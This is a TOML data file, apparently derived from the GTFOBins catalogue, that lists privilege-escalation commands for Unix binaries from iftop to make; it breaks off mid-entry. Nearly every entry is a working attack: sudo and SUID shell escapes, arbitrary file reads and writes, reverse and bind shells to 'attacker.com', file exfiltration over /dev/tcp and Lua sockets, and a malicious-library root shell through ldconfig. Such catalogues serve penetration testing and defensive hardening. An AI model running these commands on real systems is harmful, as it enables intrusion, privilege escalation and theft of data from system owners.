  [privilege-esclation.exps]
    [[privilege-esclation.exps.limited-suid]]
      exp = "./iftop\n!/bin/sh\n"
    [[privilege-esclation.exps.shell]]
      exp = "iftop\n!/bin/sh\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo iftop\n!/bin/sh\n"
[[privilege-esclation]]
  Name = "install"
  Description = "This can be run with elevated privileges to change permissions (`6` denotes the SUID bits) and then read, write, or execute a copy of the file."
  Tags = ["suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_change\nTF=$(mktemp)\nsudo install -m 6777 $LFILE $TF\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_change\nTF=$(mktemp)\n./install -m 6777 $LFILE $TF\n"
[[privilege-esclation]]
  Name = "ionice"
  Description = ""
  Tags = ["shell", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "ionice /bin/sh"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo ionice /bin/sh"
    [[privilege-esclation.exps.suid]]
      exp = "./ionice /bin/sh -p"
[[privilege-esclation]]
  Name = "ip"
  Description = "The read file content is corrupted by error prints.\n"
  Tags = ["file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nip -force -batch \"$LFILE\"\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo ip -force -batch \"$LFILE\"\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo ip netns add foo\nsudo ip netns exec foo /bin/sh\nsudo ip netns delete foo\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo ip netns add foo\nsudo ip netns exec foo /bin/ln -s /proc/1/ns/net /var/run/netns/bar\nsudo ip netns exec bar /bin/sh\nsudo ip netns delete foo\nsudo ip netns delete bar\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./ip -force -batch \"$LFILE\"\n"
    [[privilege-esclation.exps.suid]]
      exp = "./ip netns add foo\n./ip netns exec foo /bin/sh -p\n./ip netns delete foo\n"
[[privilege-esclation]]
  Name = "irb"
  Description = ""
  Tags = ["shell", "reverse-shell", "file-upload", "file-download", "file-write", "file-read", "library-load", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-download]]
      exp = "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nirb\nrequire 'open-uri'; download = open(ENV['URL']); IO.copy_stream(download, ENV['LFILE'])\n"
    [[privilege-esclation.exps.file-read]]
      exp = "irb\nputs File.read(\"file_to_read\")\n"
    [[privilege-esclation.exps.file-upload]]
      exp = "irb\nrequire 'webrick'; WEBrick::HTTPServer.new(:Port => 8888, :DocumentRoot => Dir.pwd).start;\n"
    [[privilege-esclation.exps.file-write]]
      exp = "irb\nFile.open(\"file_to_write\", \"w+\") { |f| f.write(\"DATA\") }\n"
    [[privilege-esclation.exps.library-load]]
      exp = "irb\nrequire \"fiddle\"; Fiddle.dlopen(\"lib.so\")\n"
    [[privilege-esclation.exps.reverse-shell]]
      exp = "export RHOST='127.0.0.1'\nexport RPORT=9000\nirb\nrequire 'socket'; exit if fork;c=TCPSocket.new(ENV[\"RHOST\"],ENV[\"RPORT\"]);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read} end\n"
    [[privilege-esclation.exps.shell]]
      exp = "irb\nexec '/bin/bash'\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo irb\nexec '/bin/bash'\n"
[[privilege-esclation]]
  Name = "ispell"
  Description = ""
  Tags = ["shell", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "ispell /etc/passwd\n!/bin/sh\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo ispell /etc/passwd\n!/bin/sh\n"
    [[privilege-esclation.exps.suid]]
      exp = "./ispell /etc/passwd\n!/bin/sh -p\n"
[[privilege-esclation]]
  Name = "jjs"
  Description = "This tool is installed starting with Java SE 8."
  Tags = ["sudo", "shell", "reverse-shell", "file-download", "file-write", "file-read", "suid"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-download]]
      exp = "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\necho \"var URL = Java.type('java.net.URL');\nvar ws = new URL('$URL');\nvar Channels = Java.type('java.nio.channels.Channels');\nvar rbc = Channels.newChannel(ws.openStream());\nvar FileOutputStream = Java.type('java.io.FileOutputStream');\nvar fos = new FileOutputStream('$LFILE');\nfos.getChannel().transferFrom(rbc, 0, Number.MAX_VALUE);\nfos.close();\nrbc.close();\" | jjs\n"
    [[privilege-esclation.exps.file-read]]
      exp = "echo 'var BufferedReader = Java.type(\"java.io.BufferedReader\");\nvar FileReader = Java.type(\"java.io.FileReader\");\nvar br = new BufferedReader(new FileReader(\"file_to_read\"));\nwhile ((line = br.readLine()) != null) { print(line); }' | jjs\n"
    [[privilege-esclation.exps.file-write]]
      exp = "echo 'var FileWriter = Java.type(\"java.io.FileWriter\");\nvar fw=new FileWriter(\"./file_to_write\");\nfw.write(\"DATA\");\nfw.close();' | jjs\n"
    [[privilege-esclation.exps.reverse-shell]]
      exp = "export RHOST=attacker.com\nexport RPORT=12345\necho 'var host=Java.type(\"java.lang.System\").getenv(\"RHOST\");\nvar port=Java.type(\"java.lang.System\").getenv(\"RPORT\");\nvar ProcessBuilder = Java.type(\"java.lang.ProcessBuilder\");\nvar p=new ProcessBuilder(\"/bin/bash\", \"-i\").redirectErrorStream(true).start();\nvar Socket = Java.type(\"java.net.Socket\");\nvar s=new Socket(host,port);\nvar pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\nvar po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type(\"java.lang.Thread\").sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();' | jjs\n"
    [[privilege-esclation.exps.shell]]
      exp = "echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()\" | jjs"
    [[privilege-esclation.exps.sudo]]
      exp = "echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()\" | sudo jjs"
    [[privilege-esclation.exps.suid]]
      exp = "echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()\" | ./jjs"
[[privilege-esclation]]
  Name = "joe"
  Description = ""
  Tags = ["sudo", "shell", "limited-suid"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.limited-suid]]
      exp = "./joe\n^K!/bin/sh\n"
    [[privilege-esclation.exps.shell]]
      exp = "joe\n^K!/bin/sh\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo joe\n^K!/bin/sh\n"
[[privilege-esclation]]
  Name = "join"
  Description = ""
  Tags = ["file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\njoin -a 2 /dev/null $LFILE\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo join -a 2 /dev/null $LFILE\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./join -a 2 /dev/null $LFILE\n"
[[privilege-esclation]]
  Name = "journalctl"
  Description = "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.\n\nThis might not work if run by unprivileged users depending on the system configuration.\n"
  Tags = ["shell", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "journalctl\n!/bin/sh\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo journalctl\n!/bin/sh\n"
[[privilege-esclation]]
  Name = "jq"
  Description = ""
  Tags = ["sudo", "file-read", "suid"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\njq -Rr . \"$LFILE\"\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo jq -Rr . \"$LFILE\"\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./jq -Rr . \"$LFILE\"\n"
[[privilege-esclation]]
  Name = "jrunscript"
  Description = "This tool is installed starting with Java SE 6."
  Tags = ["file-download", "file-write", "file-read", "suid", "sudo", "shell", "reverse-shell"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-download]]
      exp = "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\njrunscript -e \"cp('$URL','$LFILE')\"\n"
    [[privilege-esclation.exps.file-read]]
      exp = "jrunscript -e 'br = new BufferedReader(new java.io.FileReader(\"file_to_read\")); while ((line = br.readLine()) != null) { print(line); }'"
    [[privilege-esclation.exps.file-write]]
      exp = "jrunscript -e 'var fw=new java.io.FileWriter(\"./file_to_write\"); fw.write(\"DATA\"); fw.close();'"
    [[privilege-esclation.exps.reverse-shell]]
      exp = "export RHOST=attacker.com\nexport RPORT=12345\njrunscript -e 'var host='\"'\"\"$RHOST\"\"'\"'; var port='\"$RPORT\"';\nvar p=new java.lang.ProcessBuilder(\"/bin/bash\", \"-i\").redirectErrorStream(true).start();\nvar s=new java.net.Socket(host,port);\nvar pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\nvar po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){\nwhile(pi.available()>0)so.write(pi.read());\nwhile(pe.available()>0)so.write(pe.read());\nwhile(si.available()>0)po.write(si.read());\nso.flush();po.flush();\njava.lang.Thread.sleep(50);\ntry {p.exitValue();break;}catch (e){}};p.destroy();s.close();'\n"
    [[privilege-esclation.exps.shell]]
      exp = "jrunscript -e \"exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')\""
    [[privilege-esclation.exps.sudo]]
      exp = "sudo jrunscript -e \"exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')\""
    [[privilege-esclation.exps.suid]]
      exp = "./jrunscript -e \"exec('/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)')\""
[[privilege-esclation]]
  Name = "jtag"
  Description = ""
  Tags = ["shell", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "jtag --interactive\nshell /bin/sh\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo jtag --interactive\nshell /bin/sh\n"
[[privilege-esclation]]
  Name = "julia"
  Description = ""
  Tags = ["file-download", "reverse-shell", "suid", "sudo", "shell", "file-read", "file-write"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-download]]
      exp = "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\njulia -e 'download(ENV[\"URL\"], ENV[\"LFILE\"])'\n"
    [[privilege-esclation.exps.file-read]]
      exp = "export LFILE=file_to_read\njulia -e 'print(open(f->read(f, String), ENV[\"LFILE\"]))'\n"
    [[privilege-esclation.exps.file-write]]
      exp = "export LFILE=file_to_write\njulia -e 'open(f->write(f, \"DATA\"), ENV[\"LFILE\"], \"w\")'\n"
    [[privilege-esclation.exps.reverse-shell]]
      exp = "export RHOST=attacker.com\nexport RPORT=12345\njulia -e 'using Sockets; sock=connect(ENV[\"RHOST\"], parse(Int64,ENV[\"RPORT\"])); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'\n"
    [[privilege-esclation.exps.shell]]
      exp = "julia -e 'run(`/bin/sh`)'\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo julia -e 'run(`/bin/sh`)'\n"
    [[privilege-esclation.exps.suid]]
      exp = "./julia -e 'run(`/bin/sh -p`)'\n"
[[privilege-esclation]]
  Name = "knife"
  Description = "This is capable of running [`ruby`](/gtfobins/ruby/) code."
  Tags = ["shell", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "knife exec -E 'exec \"/bin/sh\"'\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo knife exec -E 'exec \"/bin/sh\"'\n"
[[privilege-esclation]]
  Name = "ksh"
  Description = ""
  Tags = ["file-download", "file-write", "file-read", "suid", "sudo", "shell", "reverse-shell", "file-upload"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-download]]
      exp = "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_get\nksh -c '{ echo -ne \"GET /$LFILE HTTP/1.0\\r\\nhost: $RHOST\\r\\n\\r\\n\" 1>&3; cat 0<&3; } \\\n    3<>/dev/tcp/$RHOST/$RPORT \\\n    | { while read -r; do [ \"$REPLY\" = \"$(echo -ne \"\\r\")\" ] && break; done; cat; } > $LFILE'\n"
    [[privilege-esclation.exps.file-download]]
      exp = "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_get\nksh -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'\n"
    [[privilege-esclation.exps.file-read]]
      exp = "export LFILE=file_to_read\nksh -c 'echo \"$(<$LFILE)\"'\n"
    [[privilege-esclation.exps.file-read]]
      exp = "export LFILE=file_to_read\nksh -c $'read -r -d \\x04 < \"$LFILE\"; echo \"$REPLY\"'\n"
    [[privilege-esclation.exps.file-upload]]
      exp = "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nksh -c 'echo -e \"POST / HTTP/0.9\\n\\n$(cat $LFILE)\" > /dev/tcp/$RHOST/$RPORT'\n"
    [[privilege-esclation.exps.file-upload]]
      exp = "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nksh -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT'\n"
    [[privilege-esclation.exps.file-write]]
      exp = "export LFILE=file_to_write\nksh -c 'echo DATA > $LFILE'\n"
    [[privilege-esclation.exps.reverse-shell]]
      exp = "export RHOST=attacker.com\nexport RPORT=12345\nksh -c 'ksh -i > /dev/tcp/$RHOST/$RPORT 2>&1 0>&1'\n"
    [[privilege-esclation.exps.shell]]
      exp = "ksh"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo ksh"
    [[privilege-esclation.exps.suid]]
      exp = "./ksh -p"
[[privilege-esclation]]
  Name = "ksshell"
  Description = "Each line is corrupted by a prefix string. Also consider that lines are actually parsed as `kickstart` scripts thus some file contents may lead to unexpected results.\n"
  Tags = ["file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nksshell -i $LFILE\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo ksshell -i $LFILE\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./ksshell -i $LFILE\n"
[[privilege-esclation]]
  Name = "ksu"
  Description = ""
  Tags = ["sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.sudo]]
      exp = "sudo ksu -q -e /bin/sh"
[[privilege-esclation]]
  Name = "kubectl"
  Description = "It serves files from a specified directory via HTTP, i.e., `http://<IP>:4444/x/<file>`."
  Tags = ["file-upload", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-upload]]
      exp = "LFILE=dir_to_serve\nkubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=dir_to_serve\nsudo kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=dir_to_serve\n./kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/\n"
[[privilege-esclation]]
  Name = "latex"
  Description = ""
  Tags = ["shell", "file-read", "sudo", "limited-suid"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "latex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\nstrings article.dvi\n"
    [[privilege-esclation.exps.limited-suid]]
      exp = "./latex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n"
    [[privilege-esclation.exps.shell]]
      exp = "latex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo latex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\nstrings article.dvi\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo latex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n"
[[privilege-esclation]]
  Name = "latexmk"
  Description = "This allows to execute [`perl`](/gtfobins/perl/) code."
  Tags = ["shell", "file-read", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "latexmk -e 'open(X,\"/etc/passwd\");while(<X>){print $_;}exit'\n"
    [[privilege-esclation.exps.file-read]]
      exp = "TF=$(mktemp)\necho '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}' >$TF\nstrings tmp.dvi\n"
    [[privilege-esclation.exps.shell]]
      exp = "latexmk -e 'exec \"/bin/sh\";'\n"
    [[privilege-esclation.exps.shell]]
      exp = "latexmk -latex='/bin/sh #' /dev/null\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo latexmk -e 'exec \"/bin/sh\";'"
[[privilege-esclation]]
  Name = "ld.so"
  Description = "`ld.so` is the Linux dynamic linker/loader, its filename and location might change across distributions. The proper path is can be obtained with:\n\n```\n$ strings /proc/self/exe | head -1\n/lib64/ld-linux-x86-64.so.2\n```\n"
  Tags = ["shell", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "/lib/ld.so /bin/sh"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo /lib/ld.so /bin/sh"
    [[privilege-esclation.exps.suid]]
      exp = "./ld.so /bin/sh -p"
[[privilege-esclation]]
  Name = "ldconfig"
  Description = "Follows a minimal example of how to use the described technique (details may change across different distributions).\n\nRun the code associated with the technique.\n\nIdentify a target SUID executable, for example the `libcap` library of `ping`:\n\n```\n$ ldd /bin/ping | grep libcap\n      libcap.so.2 => /tmp/tmp.9qfoUyKaGu/libcap.so.2 (0x00007fc7e9797000)\n```\n\nCreate a fake library that spawns a shell at bootstrap:\n\n```\necho '#include <unistd.h>\n\n__attribute__((constructor))\nstatic void init() {\n    execl(\"/bin/sh\", \"/bin/sh\", \"-p\", NULL);\n}\n' >\"$TF/lib.c\"\n```\n\nCompile it with:\n\n```\ngcc -fPIC -shared \"$TF/lib.c\" -o \"$TF/libcap.so.2\"\n```\n\nRun `ldconfig` again as described below then just run `ping` to obtain a root shell:\n\n```\n$ ping\n# id\nuid=1000(user) gid=1000(user) euid=0(root) groups=1000(user)\n```\n"
  Tags = ["sudo", "limited-suid"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.limited-suid]]
      exp = "TF=$(mktemp -d)\necho \"$TF\" > \"$TF/conf\"\n# move malicious libraries in $TF\n./ldconfig -f \"$TF/conf\"\n"
    [[privilege-esclation.exps.sudo]]
      exp = "TF=$(mktemp -d)\necho \"$TF\" > \"$TF/conf\"\n# move malicious libraries in $TF\nsudo ldconfig -f \"$TF/conf\"\n"
[[privilege-esclation]]
  Name = "less"
  Description = ""
  Tags = ["sudo", "suid", "shell", "file-read", "file-write"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "less file_to_read"
    [[privilege-esclation.exps.file-read]]
      exp = "less /etc/profile\n:e file_to_read\n"
    [[privilege-esclation.exps.file-write]]
      exp = "echo DATA | less\nsfile_to_write\nq\n"
    [[privilege-esclation.exps.file-write]]
      exp = "less file_to_write\nv\n"
    [[privilege-esclation.exps.shell]]
      exp = "less /etc/profile\n!/bin/sh\n"
    [[privilege-esclation.exps.shell]]
      exp = "VISUAL=\"/bin/sh -c '/bin/sh'\" less /etc/profile\nv\n"
    [[privilege-esclation.exps.shell]]
      exp = "less /etc/profile\nv:shell\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo less /etc/profile\n!/bin/sh\n"
    [[privilege-esclation.exps.suid]]
      exp = "./less file_to_read"
[[privilege-esclation]]
  Name = "lftp"
  Description = ""
  Tags = ["shell", "limited-suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.limited-suid]]
      exp = "./lftp -c '!/bin/sh'"
    [[privilege-esclation.exps.shell]]
      exp = "lftp -c '!/bin/sh'"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo lftp -c '!/bin/sh'"
[[privilege-esclation]]
  Name = "ln"
  Description = "This overrides `ln` itself with a symlink to a shell (or any other executable) that is to be executed as root, useful in case a `sudo` rule allows to only run `ln` by path. Warning, this is a destructive action."
  Tags = ["sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.sudo]]
      exp = "sudo ln -fs /bin/sh /bin/ln\nsudo ln\n"
[[privilege-esclation]]
  Name = "loginctl"
  Description = "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.\n\nThis might not work if run by unprivileged users depending on the system configuration.\n"
  Tags = ["shell", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "loginctl user-status\n!/bin/sh\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo loginctl user-status\n!/bin/sh\n"
[[privilege-esclation]]
  Name = "logsave"
  Description = ""
  Tags = ["shell", "sudo", "suid"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "logsave /dev/null /bin/sh -i"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo logsave /dev/null /bin/sh -i"
    [[privilege-esclation.exps.suid]]
      exp = "./logsave /dev/null /bin/sh -i -p"
[[privilege-esclation]]
  Name = "look"
  Description = ""
  Tags = ["file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nlook '' \"$LFILE\"\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo look '' \"$LFILE\"\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./look '' \"$LFILE\"\n"
[[privilege-esclation]]
  Name = "lp"
  Description = ""
  Tags = ["file-upload"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-upload]]
      exp = "LFILE=file_to_send\nRHOST=attacker.com\nlp $LFILE -h $RHOST\n"
[[privilege-esclation]]
  Name = "ltrace"
  Description = ""
  Tags = ["file-write", "shell", "sudo", "file-read"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nltrace -F $LFILE /dev/null\n"
    [[privilege-esclation.exps.file-write]]
      exp = "LFILE=file_to_write\nltrace -s 999 -o $LFILE ltrace -F DATA\n"
    [[privilege-esclation.exps.shell]]
      exp = "ltrace -b -L /bin/sh"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo ltrace -b -L /bin/sh"
[[privilege-esclation]]
  Name = "lua"
  Description = ""
  Tags = ["suid", "limited-suid", "shell", "file-download", "file-write", "file-read", "sudo", "non-interactive-reverse-shell", "non-interactive-bind-shell", "file-upload"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-download]]
      exp = "export LPORT=12345\nexport LFILE=file_to_save\nlua -e 'local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(os.getenv(\"LFILE\"), \"wb\");\n  f:write(d);\n  io.close(f);'\n"
    [[privilege-esclation.exps.file-read]]
      exp = "lua -e 'local f=io.open(\"file_to_read\", \"rb\"); print(f:read(\"*a\")); io.close(f);'"
    [[privilege-esclation.exps.file-upload]]
      exp = "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nlua -e '\n  local f=io.open(os.getenv(\"LFILE\"), 'rb')\n  local d=f:read(\"*a\")\n  io.close(f);\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  t:send(d);\n  t:close();'\n"
    [[privilege-esclation.exps.file-write]]
      exp = "lua -e 'local f=io.open(\"file_to_write\", \"wb\"); f:write(\"DATA\"); io.close(f);'"
    [[privilege-esclation.exps.limited-suid]]
      exp = "./lua -e 'os.execute(\"/bin/sh\")'"
    [[privilege-esclation.exps.non-interactive-bind-shell]]
      exp = "export LPORT=12345\nlua -e 'local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));c:send(b);\n  end;c:close();f:close();'\n"
    [[privilege-esclation.exps.non-interactive-reverse-shell]]
      exp = "export RHOST=attacker.com\nexport RPORT=12345\nlua -e 'local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));t:send(b);\n  end;\n  f:close();t:close();'\n"
    [[privilege-esclation.exps.shell]]
      exp = "lua -e 'os.execute(\"/bin/sh\")'"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo lua -e 'os.execute(\"/bin/sh\")'"
    [[privilege-esclation.exps.suid]]
      exp = "lua -e 'local f=io.open(\"file_to_read\", \"rb\"); print(f:read(\"*a\")); io.close(f);'"
[[privilege-esclation]]
  Name = "lualatex"
  Description = "This allows to execute [`lua`](/gtfobins/lua/) code."
  Tags = ["shell", "sudo", "limited-suid"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.limited-suid]]
      exp = "./lualatex -shell-escape '\\documentclass{article}\\begin{document}\\directlua{os.execute(\"/bin/sh\")}\\end{document}'"
    [[privilege-esclation.exps.shell]]
      exp = "lualatex -shell-escape '\\documentclass{article}\\begin{document}\\directlua{os.execute(\"/bin/sh\")}\\end{document}'"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo lualatex -shell-escape '\\documentclass{article}\\begin{document}\\directlua{os.execute(\"/bin/sh\")}\\end{document}'"
[[privilege-esclation]]
  Name = "luatex"
  Description = "This allows to execute [`lua`](/gtfobins/lua/) code."
  Tags = ["shell", "sudo", "limited-suid"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.limited-suid]]
      exp = "./luatex -shell-escape '\\directlua{os.execute(\"/bin/sh\")}\\end'"
    [[privilege-esclation.exps.shell]]
      exp = "luatex -shell-escape '\\directlua{os.execute(\"/bin/sh\")}\\end'"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo luatex -shell-escape '\\directlua{os.execute(\"/bin/sh\")}\\end'"
[[privilege-esclation]]
  Name = "lwp-download"
  Description = "Fetch a remote file via HTTP GET request."
  Tags = ["file-write", "file-download", "sudo", "file-read"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-download]]
      exp = "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nlwp-download $URL $LFILE\n"
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nTF=$(mktemp)\nlwp-download \"file://$LFILE\" $TF\ncat $TF\n"
    [[privilege-esclation.exps.file-write]]
      exp = "LFILE=file_to_write\nTF=$(mktemp)\necho DATA >$TF\nlwp-download file://$TF $LFILE\n"
    [[privilege-esclation.exps.sudo]]
      exp = "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo lwp-download $URL $LFILE\n"
[[privilege-esclation]]
  Name = "lwp-request"
  Description = ""
  Tags = ["file-read", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nlwp-request \"file://$LFILE\"\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo lwp-request \"file://$LFILE\"\n"
[[privilege-esclation]]
  Name = "mail"
  Description = ""
  Tags = ["shell", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "mail --exec='!/bin/sh'"
    [[privilege-esclation.exps.shell]]
      exp = "TF=$(mktemp)\necho \"From nobody@localhost $(date)\" > $TF\nmail -f $TF\n!/bin/sh\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo mail --exec='!/bin/sh'"
[[privilege-esclation]]
  Name = "make"
  Description = "All these examples only work with GNU `make` due to the lack of support of the `--eval` flag. The same can be achieved by using a proper `Makefile` or by passing the content via stdin using `-f -`."
  Tags = ["shell", "file-write", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-write]]
      exp = "LFILE=file_to_write\nmake -s --eval=\"\\$(file >$LFILE,DATA)\" .\n"
    [[privilege-esclation.exps.shell]]
      exp = "COMMAND='/bin/sh'\nmake -s --eval=$'x:\\n\\t-'\"$COMMAND\"\n"
    [[privilege-esclation.exps.sudo]]
      exp = "COMMAND='/bin/sh'\nsudo make -s --eval=$'x:\\n\\t-'\"$COMMAND\"\n"
    [[privilege-esclation.exps.suid]]
